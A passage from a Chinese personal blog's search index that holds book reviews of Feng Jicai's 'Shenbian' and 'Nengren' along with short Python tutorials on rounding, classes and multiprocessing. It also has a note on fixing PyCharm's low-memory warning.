请神容易送神难</font></p></blockquote><hr><blockquote><p>原来大人物，一半靠名，那名是哪来的，只有他妈鬼知道了。</p><hr><p>我可以告明白你，打你没生下来，这世上的每一寸地面上都有名有姓，你想立足，谈何容易。</p><p>—— <font color="green">引自   第六回 祖师爷亮相</font></p></blockquote><hr><blockquote><p>人像蜜蜂，哪儿开花往哪飞。<br>　　您点高时，乱轰轰一大团围住您，没法分清；可是等到您点低的时候，真假远近，可就立刻看得一清二楚。天津卫有句俗话，叫做：倒霉认朋友。</p><p>—— <font color="green">引自   第七回 广来洋货店的掌柜杨殿起</font></p></blockquote><hr><blockquote><p>祖宗的东西再好，该割的时候就得割。我把‘鞭’剪了，‘神’却留着。</p><p>—— <font color="green">引自 第十五回 神枪手</font></p></blockquote><h1 id="4-自评"><a class="markdownIt-Anchor" href="#4-自评"></a> 4 自评</h1><p>从《俗世奇人》过来的。</p><p>相对于《俗世奇人》，《神鞭》是中篇小说，读起来更加过瘾。而且具有很强的时代烙印，具体的可以参考下面的评论。</p><p>也被翻拍成了电影和电视剧。</p><h1 id="5-他评"><a class="markdownIt-Anchor" href="#5-他评"></a> 5 他评</h1><blockquote><p>老背着祖宗，还怎么往前走</p><p>—— <font color="blue">引自 <a href="https://m.douban.com/book/comment/698377442?dt_platform=com.douban.activity.qq_session&amp;dt_dapp=1" target="_blank" rel="noopener">豆瓣 [已注销]</a></font></p></blockquote><hr><blockquote><center>改革开放练就“神鞭”</center><p>不管黑猫白猫，抓住老鼠就是好猫。不管辫子手枪，打败敌人才能称神。这《神鞭》创作于1984年，不用说，是为改革开放摇旗呐喊呢。</p><p>在街上卖臭豆腐的傻二身上有一样祖传的功夫——他的辫子是一条神鞭，指哪打哪能左能右，只是“养在深闺人未识”，无人得知。后来，他遇到大混混玻璃花闹事逞凶，出于正义挺身而出，一出手就痛揍了一群混混，这下一战成名。玻璃花为报这一鞭之仇，先后撺掇了玩弹弓的戴奎一、武术大师索天响（感觉这人有点像教条主义的王明）以及东洋武士佐藤来上门挑战，这仨人全被傻二打了个落花流水，傻二更是名声大噪。 后来八国联军入侵北京，傻二加入义和团，攻打紫竹林租界。义和团的师兄弟们有不少都是练家子，一把大刀耍的溜溜转，大家群情振奋、士气高涨。可谁知洋枪竟然这么厉害，任你铁布衫、金钟罩，挨上一枪就毙命，傻二死里逃生，可是辫子挨了一枪被打断了。神鞭的功夫不含糊，其他习武人都赢不了他，可这是在拳脚上，火枪和冷兵器就是一个时代的差距了。</p><p>上一代的旗舰有可能比不上现在的低端，iphone4是当时最先进也最贵的手机，可是它的性能还比不上今天的低端红米。印加文明把结绳记字的科技树给点满发明了奇普， 通过方向、颜色、绳子、大小等极其复杂的专业方式来记录帝国的历史、财政、人口，可是再厉害的结绳记事也比不过最简陋的甲骨文来的方便。阿兹特克人发展出石器时代的顶级武器马夸威特，一种将黑曜石镶嵌在木棒上打造出的可怕冷兵器，并用它来装备最精锐的力量“美洲虎武士”。随着后来西班牙人入侵和阿兹特克帝国的覆灭，骁勇的“美洲虎武士”和“马夸威特”都被带入了历史的尘埃。</p><p><img src="https://img9.doubanio.com/view/thing_review/l/public/p5177922.webp" alt="img"></p><p>人类结绳记事的顶峰——印加奇普</p><p><img src="https://img9.doubanio.com/view/thing_review/l/public/p5177923.webp" alt="img"></p><p>文字的雏形甲骨文</p><p><img src="https://img9.doubanio.com/view/thing_review/l/public/p5177924.webp" alt="img"></p><p>电影《启示录》中手持马夸威特的武士</p><p>傻二被没打没了信心，以前油亮黑壮的大粗辫子成了半截焦黄的辫子耷拉着，祖传的功夫被人破了，一下子没了威风。可傻二不傻，傻二痛定思痛，悟出了功夫再深也敌不过洋枪的道理，毅然剪掉辫子拿起了洋枪，变神鞭为神枪，多年回来后，傻二没了辫子，但是成了神枪手。</p><p>一个打算盘二十年的老账房先生很难放弃算盘学office。山本五十六曾经谋划了空袭珍珠港的惊天大手笔，6艘航母满载441架飞机，经过一个多小时奔袭珍珠港，给予了美国珍珠港海军毁灭性打击。山本五十六预见到了未来海上战争是以空制海，有制空权才能有制海权，此时应该大力发展航空母舰，发展以航母为核心配备驱逐舰、护卫舰的航母战斗群。但此时掌权的人都是日俄战争时期成长起来的大佬，这些陆军部老顽固们认为海军应该是厚装甲、大口径炮的战列舰，甚至有老顽固认为海军只要把士兵运送到位置就可以了，打仗还是要在陆地上打。现在的军舰战术都讲究空中、海上、水下的一体协同作战，不再使用二战时期那么厚的装甲来硬碰硬，战列舰在二战时期发展到了顶点，也走到了终点。</p><p><img src="https://img9.doubanio.com/view/thing_review/l/public/p5241765.webp" alt="img"></p><p>世界史上最大吨位的战列舰大和号梦沉太平洋</p><p>傻二剪掉了头上的辫子，更重要的是剪掉了心里的辫子，而现在很多人却还是留着看不见的辫子，这不能不说是个遗憾了。</p><p>—— <font color="blue">引自 <a href="https://book.douban.com/review/12923808/?dt_dapp=1&amp;dt_platform=com.douban.activity.qq_session" target="_blank" rel="noopener">豆瓣 鳄鱼不饿</a></font></p></blockquote><h1 id="6-拓展"><a class="markdownIt-Anchor" href="#6-拓展"></a> 6 拓展</h1><ul><li>电影：<a href="https://dragonliu.tk/2022/02/12/%E3%80%8A%E7%A5%9E%E9%9E%AD%E3%80%8B%E7%94%B5%E5%BD%B1/" target="_blank" rel="noopener">《神鞭》(1986)</a></li><li>电视剧：《神鞭》(2001)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书评 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《能人》书籍</title>
      <link href="/2022/02/12/%E3%80%8A%E8%83%BD%E4%BA%BA%E3%80%8B%E4%B9%A6%E7%B1%8D/"/>
      <url>/2022/02/12/%E3%80%8A%E8%83%BD%E4%BA%BA%E3%80%8B%E4%B9%A6%E7%B1%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>天津是个码头，码头上的人争强好胜，自然是谁有本事佩服谁。这种心理衍及社会各行各业，都是钦佩能人。所谓能人是真有本事的人，技高一筹的人，身怀绝技的人。</p><p>大回、酒婆、甄一口、管万斤、李铁柱、卓乃丽……这些人中既有显耀上层，更有市井小民，既能空手拿贼，又能平地抠饼，性格又辣又热，又爽又嘎，行事出人意表却又坚持着自己的道义，令人称奇叫绝，钦佩不已。</p><p>冯骥才执笔50年白金纪念版经典小说集《能人》，从清末民初到改革开放，有奇人异事，也有生活纪实，或幽默诙谐，或讽刺批判，或感怀过往，或温馨治愈，全面呈现天津卫近百位奇人异士的生活风貌和传奇人生，被读者誉为一幅“天津卫的清明上河图”。</p><h1 id="2-作者"><a class="markdownIt-Anchor" href="#2-作者"></a> 2 作者</h1><p>冯骥才，浙江宁波慈溪人，1942年2月9日生于天津，作家、画家。 早年在天津从事绘画工作，后专职文学创作和民间文化研究。</p><ul><li><a href="https://baike.baidu.com/item/%E5%86%AF%E9%AA%A5%E6%89%8D/630264?fr=aladdin" target="_blank" rel="noopener">百度百科</a></li><li><a href="https://zh.wikipedia.org/wiki/%E5%86%AF%E9%AA%A5%E6%89%8D" target="_blank" rel="noopener">维基百科</a></li></ul><h1 id="3-摘抄"><a class="markdownIt-Anchor" href="#3-摘抄"></a> 3 摘抄</h1><blockquote><p>人生中有许多问题是永远也解不开的方程式。</p><p>***</p><p>有人说，从一个人身边的书，可以找到通往他心底最绝妙的缝隙。</p><p>***</p><p>在人们的闲话里，大概没有一个完美的人，总是更坏一些，而不是更好一些。弱者会在闲话里畏首畏尾，最后被搞得神经衰弱。</p><p>—— <font color="green">引自 在两个问号之间</font></p></blockquote><hr><blockquote><p>你家院里有棵小树，树干光溜溜，早瞧惯了，可是有一天它忽然变得七扭八弯，愈看愈别扭。但日子一久，你就看顺眼了，仿佛它本来就应该是这样子。如果某一天，它忽然重新变直，你又会觉得说不出多么不舒服。它单调、乏味、简易，像根棍子！其实，它不过恢复最初的模样，你何以又别扭起来？</p><hr><p>人们总是按照自己的思维方式去解释世界，尽力把一切事物都和自己的理解力拉平。</p><hr><p>这时，人们有种奇妙的感觉，觉得那伞下好像有长长一大块空间，空空的，世界上任什么东西也填补不上。</p><p>—— <font color="green">引自 高女人和她的矮丈夫</font></p></blockquote><hr><blockquote><p>这女子在杭州上大学，念中文，喜欢文学的女子都很看重人的心意。而真正的爱慕，往往是从对方身上感触到自己人生理想的准则开始的。还有比关水龙头再小的事吗？但对于这念文科的女子，它就像一束细细的光照亮一个世界。有了这样的来自心灵的因由，胡子就不会是任何障碍了。</p><p>—— <font color="green">引自 胡子</font></p></blockquote><hr><blockquote><p>有时这小天地的佼佼者，也会有君主、国王那样的自我富足感。</p><p>—— <font color="green">引自 金色的眼镜腿儿</font></p></blockquote><hr><blockquote><p>一 个人总会由于自己的某种缺陷或不足而羡慕别人。脸黑的羨慕脸白的；记性差的羡慕记性好的；牙齿糟烂的，羡慕别人的一口好牙；手笨的，羡慕人家心灵手巧；老年人羡慕青年人精力有余。</p><p>活人的悲剧比舞台上的悲剧，更能满足一个人的好奇心。</p><p>—— <font color="green">引自 陌客</font></p></blockquote><hr><blockquote><p>世界上，无论好事坏事、大事小事总得过去。新鲜的玩意儿刚到手如获至宝，看惯了也就习以为常。</p><p>—— <font color="green">引自 匈牙利脚踏车</font></p></blockquote><hr><blockquote><p>每个人都有自己童年和少年时代的朋友，好像朝日曙照、云霞、露珠一样，总是属于那一段时光里同时出现的，互相为伴，汇成片灿烂缤纷的景象，过后就纷纷散失了。</p><hr><p>那时，世道狂乱，人人失去常恋，宁肯无知，宁愿心很，还有许多出奇的妄想，恨不得从身旁发现出希特勒。</p><hr><p>我第一次感受到，一个人把话存在心里，他才是充实的。</p><p>—— <font color="green">引自 在早春的日子里</font></p></blockquote><hr><blockquote><p>我接过油毡时，你并没有客气或感谢地笑一笑。你用你黑黑的眼睛专注地望我一眼，这眼好深。你不是用眼，是用心灵望我。那时谁还会用全部心灵望一个陌生人，像人望大自然那样，无戒备的，感受的。后来我发现你也用这样的目光望一切。可是当你望我时，世界忽然变得一尘不染。</p><hr><p>男人对女人就该有保护意识。女人乐不乐意接受是另一码事。要不怎么证实自己的性别，还称什么男子汉</p><hr><p>你们只想叫我坐稳，把你们碰到的一个个难题提给我。我高兴用我的机智把这些问号打碎，还有些问号你们明知道我也没辙，却喜欢看我拿笑话把它扭得变形，不再像问号，好玩。</p><p>—— <font color="green">引自 船歌</font></p></blockquote><h1 id="4-自评"><a class="markdownIt-Anchor" href="#4-自评"></a> 4 自评</h1><p>从《俗世奇人》过来的。</p><p>书籍前半部分收录《俗世奇人》的文章，后半部分内容是新中国的事，风格也发生了变化，不再是“奇人”、“能人”，更多的是讽刺现实。</p><p>其中《船歌》第一次读直接略过了，后来整理博客、翻阅书评时，才又读了一遍，感觉唯美浪漫。只能说书籍后半部分需要静下心来仔细品味，不能像读《俗世奇人》那般。</p><h1 id="5-他评"><a class="markdownIt-Anchor" href="#5-他评"></a> 5 他评</h1><blockquote><p>书名能人二字指得是书里的前13个短篇，都是民国年间天津卫的奇闻轶事。码头文化滋养之下，天津人性格有股子英雄主义情结，不畏强权不畏财富，做事讲究个狠字，不论是戏曲、武行、生意或是官场，能耐大过天。不过在沧海横流的世道，生死转瞬间，也应了那句话“能人都死在了能耐之下”。感叹作者笔力了的，急促紧凑地叙事，一把薅住人物特点，再寥寥几笔故事冲突和张力陡然凝聚，读着真过瘾。后半部分就是小人物众生相，《我这个笨蛋》中为换个大房子而走后门时，反复吃暗亏的窝囊小职员，《在两个问号之间》里斥责插队政策是下乡知青与农民不睦婚姻的黑手，背后的精神世界鸿沟无法弥合。还有《金色眼镜腿》《匈牙利脚踏车》《两医生》呈现知识分子在官僚和腐败体系下内心的价值观冲撞，一种愤恨情绪宣发。整体文本是老派的，规矩雅致，没有无聊的炫技。</p><p>—— <font color="blue">引自 <a href="https://m.douban.com/book/comment/2656527755?dt_platform=com.douban.activity.qq_session&amp;dt_dapp=1" target="_blank" rel="noopener">豆瓣 大脸</a></font></p></blockquote><hr><blockquote><p>这本书的策划方向错了，或者说故意错，往《俗世奇人》的方向上靠。收录了几篇《奇人》里的故事，但后面的故事跟“奇人”“能人”都没关系了。反倒是婚姻、情感故事居多，往这个方向策划，没准儿更好。《看一眼》《船歌》《在早春的日子》这几篇更喜欢，很浪漫。</p><p>—— <font color="blue">引自 <a href="https://m.douban.com/book/comment/2643966284?dt_platform=com.douban.activity.qq_session&amp;dt_dapp=1" target="_blank" rel="noopener">豆瓣 鹿原</a></font></p></blockquote><hr><blockquote><center>读《能人》有感</center><p>318分钟，读完了今年的第一本电子书。事实上，这也是今年第一本兴趣使然读完的书。</p><p>读这本书的前半程，就像初冬时节，在喧嚣的天津码头揣兜儿晃荡，路过酒肆，穿过大集，看那各路能人轮番登场，热闹非凡。泥人张，酒婆，管万金，冯五爷…任你在天津的地界儿忘记时间，比起什么生活的真谛，人生的意义，这浓烈的烟火气就是舒坦。</p><p>后半程的故事一样精彩生动，后劲儿更足，更深刻。读完总要让你回过味儿再想一想，琢磨琢磨。读完《两个问号之间》，连续好几天做饭的时候，我都在纠结要怎么给卓乃丽写封信，看完《今天接着昨天》，觉着又感动，又刺痛。最后一篇《老夫老妻》读的我紧张又着急，又不舍得往后面翻。</p><p>书里的小故事个个儿精彩万分，读这本书的感觉就像有一壶热腾腾的烧酒，却不敢贪杯。茶余饭后看看书，读读故事，兴致盎然，尽是风景。</p><p>—— <font color="blue">引自 <a href="https://book.douban.com/review/14034001/?dt_dapp=1&amp;dt_platform=com.douban.activity.qq_session" target="_blank" rel="noopener">豆瓣 小胡同学</a></font></p></blockquote><h1 id="6-拓展"><a class="markdownIt-Anchor" href="#6-拓展"></a> 6 拓展</h1><p>是否被拍成影视作品？（无）</p>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书评 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-取整</title>
      <link href="/2022/02/11/Python-%E5%8F%96%E6%95%B4/"/>
      <url>/2022/02/11/Python-%E5%8F%96%E6%95%B4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-向下取整int"><a class="markdownIt-Anchor" href="#1-向下取整int"></a> 1 向下取整——int()</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f1 = <span class="number">1.23</span></span><br><span class="line">print(int(f1))  <span class="comment"># 1</span></span><br><span class="line">f2 = <span class="number">1.73</span></span><br><span class="line">print(int(f2))  <span class="comment"># 1</span></span><br></pre></td></tr></table></figure><h1 id="2-向上取整ceil"><a class="markdownIt-Anchor" href="#2-向上取整ceil"></a> 2 向上取整——ceil()</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">f1 = <span class="number">1.23</span></span><br><span class="line">print(math.ceil(f1))  <span class="comment"># 2</span></span><br><span class="line">f2 = <span class="number">1.73</span></span><br><span class="line">print(math.ceil(f2))  <span class="comment"># 2</span></span><br></pre></td></tr></table></figure><h1 id="3-四舍五入round"><a class="markdownIt-Anchor" href="#3-四舍五入round"></a> 3 四舍五入——round()</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f1 = <span class="number">1.23</span></span><br><span class="line">print(round(f1))  <span class="comment"># 1</span></span><br><span class="line">f2 = <span class="number">1.73</span></span><br><span class="line">print(round(f2))  <span class="comment"># 2</span></span><br></pre></td></tr></table></figure><h1 id="4-分别取整数和小数部分"><a class="markdownIt-Anchor" href="#4-分别取整数和小数部分"></a> 4 分别取整数和小数部分</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f1 = <span class="number">1.23</span></span><br><span class="line">print(math.modf(f1))  <span class="comment"># (0.22999999999999998, 1.0)</span></span><br></pre></td></tr></table></figure><p>至于小数部分不准确：涉及<strong>浮点数在计算机中的表示</strong>。在计算机中是无法精确的表示小数的，至少目前的计算机做不到这一点。Python 和 C 一样, 采用 <code>IEEE 754</code> 规范来存储浮点数。</p><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/365406577" target="_blank" rel="noopener">python中取整数的四种方法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-类-使用简易教程</title>
      <link href="/2022/02/11/Python-%E7%B1%BB-%E4%BD%BF%E7%94%A8%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"/>
      <url>/2022/02/11/Python-%E7%B1%BB-%E4%BD%BF%E7%94%A8%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-模板"><a class="markdownIt-Anchor" href="#1-模板"></a> 1 模板</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="comment"># 类属性</span></span><br><span class="line">    is_fail = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, sid, fid)</span>:</span></span><br><span class="line">        self.id = sid  <span class="comment"># 唯一标志信息</span></span><br><span class="line">        self.fid = fid  <span class="comment"># 父进程唯一标志信息</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_id</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.id</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_fid</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.fid</span><br><span class="line"></span><br><span class="line">test_action = Action(sid=sid, fid=fid)</span><br><span class="line">print(test_action.get_id())</span><br><span class="line">print(Action.is_fail)</span><br></pre></td></tr></table></figure><p>更多参考：<a href="https://www.runoob.com/python3/python3-class.html" target="_blank" rel="noopener">菜鸟教程</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-多线程&amp;多进程-编程教程</title>
      <link href="/2022/02/11/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B&amp;%E5%A4%9A%E8%BF%9B%E7%A8%8B-%E7%BC%96%E7%A8%8B/"/>
      <url>/2022/02/11/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B&amp;%E5%A4%9A%E8%BF%9B%E7%A8%8B-%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引言"><a class="markdownIt-Anchor" href="#1-引言"></a> 1 引言</h1><p>最近在做恶意样本行为可视化，样本数量2w+，执行时间&gt;24h，所以需要多任务处理来提高效率。</p><blockquote><p>参考：<a href="https://blog.csdn.net/qq_40317897/article/details/89921083" target="_blank" rel="noopener">Python多进程和多线程（跑满CPU）</a></p></blockquote><p>任务可以理解为进程（process），如打开一个word就是启动一个word进程。在一个word进程之中不只是进行打字输入，还需要拼写检查、打印等子任务，我们可以把进程中的这些子任务称为线程（thread）。</p><p>同时执行多个任务通常各个任务之间并不是没有关联的，而是需要相互通信和协调，有时，任务1必须暂停等待任务2完成后才能继续执行，有时，任务3和任务4又不能同时执行，所以，多进程和多线程的程序的复杂度要远远高于我们前面写的单进程单线程的程序。</p><h1 id="2-多任务实现的3种方式"><a class="markdownIt-Anchor" href="#2-多任务实现的3种方式"></a> 2 多任务实现的3种方式</h1><h2 id="21-多进程模式"><a class="markdownIt-Anchor" href="#21-多进程模式"></a> 2.1 多进程模式</h2><p>启动多个进程，每个进程虽然只有一个线程，但多个进程可以一块执行多个任务。<font color="red">多个CPU核心可以一起做多个任务。</font></p><p>进程执行带有参数的任务：</p><table><thead><tr><th>参数名</th><th>说明</th></tr></thead><tbody><tr><td>args</td><td>以元祖的方式给任务传递参数, 顺序要正确</td></tr><tr><td>kwrags</td><td>以字典的方式给执行任务传递参数, key 跟参数名要一致</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(data)</span>:</span></span><br><span class="line">    print(data, <span class="string">'进程PID'</span>, os.getpid())</span><br><span class="line">    print(data, <span class="string">'进程父进程编号'</span>, os.getppid())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_multiprocess</span><span class="params">()</span>:</span></span><br><span class="line">    data_list = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">    core = <span class="number">4</span>  <span class="comment"># 4进程并行</span></span><br><span class="line">    mod = math.ceil(len(data_list) / core)  <span class="comment"># 向上取整</span></span><br><span class="line">    group_data = [data_list[i:i + mod] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(data_list), mod)]</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> group_data:</span><br><span class="line">        <span class="comment"># process = multiprocessing.Process(target=func, args=(5,))</span></span><br><span class="line">        process = multiprocessing.Process(target=func, kwargs=&#123;<span class="string">'data'</span>: data&#125;)</span><br><span class="line">        process.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    test_multiprocess()</span><br></pre></td></tr></table></figure><h2 id="22-多线程模式"><a class="markdownIt-Anchor" href="#22-多线程模式"></a> 2.2 多线程模式</h2><p>启动一个进程，在一个进程内启动多个线程，这样，多个线程也可以一块执行多个任务。<font color="red">单个CPU核心可以同时做多个任务。</font></p><p><a href="https://www.runoob.com/python/python-multithreading.html" target="_blank" rel="noopener">菜鸟教程——多线程</a></p><h2 id="23-多进程多线程模式"><a class="markdownIt-Anchor" href="#23-多进程多线程模式"></a> 2.3 多进程+多线程模式</h2><p>启动多个进程，每个进程再启动多个线程，这样同时执行的任务就更多了，当然这种模型更复杂，实际很少采用。</p><h1 id="3-进程线程对比"><a class="markdownIt-Anchor" href="#3-进程线程对比"></a> 3 进程线程对比</h1><h2 id="31-关系对比"><a class="markdownIt-Anchor" href="#31-关系对比"></a> 3.1 关系对比</h2><ol><li>线程是依附在进程里边的, 没有进程就没有线程</li><li>一个进程默认提供一条线程, 进程可以创建多个线程</li></ol><h2 id="32-区别对比"><a class="markdownIt-Anchor" href="#32-区别对比"></a> 3.2 区别对比</h2><ol><li>进程创建的开销要比线程的开销要大</li><li>进程是操作系统资源分配的基本单位, 线程是cpu 调度的基本单位</li><li>线程不能独立执行, 必须依存进程</li></ol><h2 id="33-优缺点对比"><a class="markdownIt-Anchor" href="#33-优缺点对比"></a> 3.3 优缺点对比</h2><ol><li><p>进程优缺点:</p><p>优点：可以用多核</p><p>缺点：资源开销大</p></li><li><p>线程优缺点</p><p>优点: 资源开销小</p><p>缺点：不能使用多核</p></li></ol><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/340657122" target="_blank" rel="noopener">在Python中优雅地用多进程</a></li><li><a href="https://blog.csdn.net/qq_43475705/article/details/115518463" target="_blank" rel="noopener">python多进程多线程,多个程序同时运行</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pycharm(IntelliJ系列)的Low Memory问题</title>
      <link href="/2022/02/11/Pycharm-IntelliJ-%E7%9A%84Low-Memory%E9%97%AE%E9%A2%98/"/>
      <url>/2022/02/11/Pycharm-IntelliJ-%E7%9A%84Low-Memory%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题引入"><a class="markdownIt-Anchor" href="#1-问题引入"></a> 1 问题引入</h1><p>最近在跑恶意样本可视化的脚本，Pycharm出现：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Low Memory</span><br><span class="line">The IDE is running low on memory and this might affect performance. Please consider increasing available heap.</span><br></pre></td></tr></table></figure><p>原因是IDE内存不足（之前给pycharm设定了2048M，跑大项目会出现上述问题）。</p><p>主要copy于 <a href="https://www.cnblogs.com/baby123/p/15626312.html" target="_blank" rel="noopener">idea 的Low Memory问题</a></p><h1 id="2-解决方法"><a class="markdownIt-Anchor" href="#2-解决方法"></a> 2 解决方法</h1><p>下面的方法适用于IntelliJ系列产品，如Pycharm、idea等。</p><h2 id="21-直接配置"><a class="markdownIt-Anchor" href="#21-直接配置"></a> 2.1 直接配置</h2><img src="https://s2.loli.net/2022/02/11/ulXpqTxoQSt1mRB.png" width="800" height="200" alt="图片名称" align="center" id="68"><p>选择上图里的 Configure，修改堆大小：</p><img src="https://s2.loli.net/2022/02/11/luJ4ba1mBA3G2hE.png" width="300" height="200" alt="图片名称" align="center" id="69"><p>重启IDE生效。</p><h2 id="22-通过help配置修改"><a class="markdownIt-Anchor" href="#22-通过help配置修改"></a> 2.2 通过help配置修改</h2><p>菜单 Help -&gt; 选择 Edit Custom VM Options，会打开 pycharm64.exe.vmoptions文件，修改配置即可。</p><img src="https://s2.loli.net/2022/02/11/EgGpOs8Miow1VSe.png" width="600" height="400" alt="图片名称" align="center" id="70"><p>此时发现<code>Change Memory Settings</code>中已经发生了变化：</p><img src="https://s2.loli.net/2022/02/11/KPSpc5fVvUZR7ON.png" width="600" height="400" alt="图片名称" align="center" id="71"><p>最后重启IDE生效。</p>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-集合-操作教程</title>
      <link href="/2022/02/10/Python-%E9%9B%86%E5%90%88-%E6%93%8D%E4%BD%9C%E6%95%99%E7%A8%8B/"/>
      <url>/2022/02/10/Python-%E9%9B%86%E5%90%88-%E6%93%8D%E4%BD%9C%E6%95%99%E7%A8%8B/</url>
      
